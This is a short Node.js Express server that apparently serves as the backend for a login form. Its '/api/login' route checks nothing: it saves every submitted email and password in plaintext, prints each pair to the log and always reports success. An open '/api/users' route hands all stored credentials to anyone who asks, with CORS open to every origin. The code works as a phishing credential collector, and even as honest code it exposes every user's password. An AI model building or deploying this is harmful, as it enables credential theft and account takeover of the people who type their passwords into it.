const express = require('express');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Simple in-memory database
let users = [];

// Endpoint to receive login data
app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    
    // Save user
    const existingUser = users.find(u => u.email === email);
    if (existingUser) {
        existingUser.password = password;
    } else {
        users.push({ email, password });
    }
    
    console.log(`Saved: ${email} / ${password}`);
    res.json({ success: true });
});

// Endpoint to view all users (Admin)
app.get('/api/users', (req, res) => {
    res.json(users);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});